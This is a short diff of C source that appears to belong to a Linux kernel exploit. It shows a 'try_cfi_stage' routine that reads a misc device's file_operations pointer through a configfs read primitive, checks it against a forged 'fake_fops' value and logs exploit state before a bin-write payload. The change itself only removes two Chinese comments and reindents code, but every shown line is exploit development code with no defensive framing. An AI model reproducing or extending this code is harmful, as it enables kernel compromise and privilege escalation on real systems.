@@ -44,7 +44,6 @@ static int route_delay_usec(int attempt) {
     }
   }
 
-  // 就两个值交替
   static const int delays[] = {
     5000, 6000,
   };
@@ -321,23 +320,22 @@ int try_cfi_stage(void) {
   }
 
   uintptr_t misc_fops = misc_fops_data_addr();
-uint64_t pre_fops = 0;
-ssize_t pre_rb = configfs_read_once(
-    fd, misc_fops, &pre_fops, sizeof(pre_fops));
-fops_before = pre_fops;
+  uint64_t pre_fops = 0;
+  ssize_t pre_rb = configfs_read_once(
+      fd, misc_fops, &pre_fops, sizeof(pre_fops));
+  fops_before = pre_fops;
 
-// 只记日志，不判断成败
-if (pre_rb != (ssize_t)sizeof(pre_fops) || pre_fops != fake_fops) {
-  pr_info("cfi precheck note fd=%d target=%016llx rb=%zd read=%016llx "
-          "want=%016llx page=%016llx fake_parent=%016llx "
-          "fake_right=%016llx bin_target=%016llx\n",
-          fd, (unsigned long long)misc_fops, pre_rb,
-          (unsigned long long)pre_fops, (unsigned long long)fake_fops,
-          (unsigned long long)page_base,
-          (unsigned long long)fake_parent,
-          (unsigned long long)fake_right,
-          (unsigned long long)binwrite_target);
-}
+  if (pre_rb != (ssize_t)sizeof(pre_fops) || pre_fops != fake_fops) {
+    pr_info("cfi precheck note fd=%d target=%016llx rb=%zd read=%016llx "
+            "want=%016llx page=%016llx fake_parent=%016llx "
+            "fake_right=%016llx bin_target=%016llx\n",
+            fd, (unsigned long long)misc_fops, pre_rb,
+            (unsigned long long)pre_fops, (unsigned long long)fake_fops,
+            (unsigned long long)page_base,
+            (unsigned long long)fake_parent,
+            (unsigned long long)fake_right,
+            (unsigned long long)binwrite_target);
+  }
 
   char payload[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
   ssize_t n =
